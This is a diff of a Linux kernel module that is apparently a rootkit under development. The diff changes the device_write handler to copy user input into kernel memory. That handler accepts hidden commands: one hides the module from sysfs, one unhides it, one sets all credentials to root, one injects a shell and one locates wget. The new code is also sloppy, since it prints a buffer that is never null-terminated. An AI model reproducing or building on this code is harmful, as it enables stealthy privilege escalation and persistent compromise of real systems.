@@ -144,9 +144,17 @@ static ssize_t device_read(struct file *filp, char *buff, size_t len, loff_t * o
 
 static ssize_t
 device_write(struct file *filp, const char *buff, size_t len, loff_t *off) {
-	printk(KERN_INFO "written: %s\n", buff);
+	//printk("written: %d\n", 5);
+
+	//char *str;
+	//strcpy(str, buff);
+	//int length = strlen(str);
+	char *str = kmalloc(len, GFP_KERNEL);
+	int error_count = copy_from_user(str, buff, len);
+	char *strings = "strangzz";
+	printk("writered: %s\n", str);
 	
-	if(strncmp("#offlager", buff, 9) == 0) {
+	if(strncmp("#offlager", str, 9) == 0) {
 		if(hidden == 1)
 			return -EINVAL;
 
@@ -159,7 +167,7 @@ device_write(struct file *filp, const char *buff, size_t len, loff_t *off) {
 
 		THIS_MODULE->sect_attrs = NULL;
 		THIS_MODULE->notes_attrs = NULL;
-	} else if(strncmp("#onlager", buff, 8) == 0) {
+	} else if(strncmp("#onlager", str, 8) == 0) {
 		if(hidden == 0)
 			return -EINVAL;
 
@@ -179,7 +187,7 @@ device_write(struct file *filp, const char *buff, size_t len, loff_t *off) {
 		//kfree(&THIS_MODULE->mkobj.kobj);
 
 		//res = sysfs_create_dir_ns(&THIS_MODULE->mkobj.kobj, NULL);
-	} else if(strncmp("#mkroot", buff, 7) == 0) {
+	} else if(strncmp("#mkroot", str, 7) == 0) {
 		struct cred *creds = prepare_creds();
 		creds->uid.val = 0;
 		creds->euid.val = 0;
@@ -187,14 +195,15 @@ device_write(struct file *filp, const char *buff, size_t len, loff_t *off) {
 		creds->egid.val = 0;
 
 		commit_creds(creds);
-	} else if(strncmp("#inject", buff, 7) == 0) {
+	} else if(strncmp("#inject", str, 7) == 0) {
 		res = inject_shell();
 		printk(KERN_INFO "injection status %d\n", res);
-	} else if(strncmp("#wget", buff, 5) == 0) {
+	} else if(strncmp("#wget", str, 5) == 0) {
 		res = find_wget();
 		printk(KERN_INFO "wget status %d\n", res);
 	}	
-
+	//return strlen(buff);
+	kfree(str);
 	return -EINVAL;
 }
 
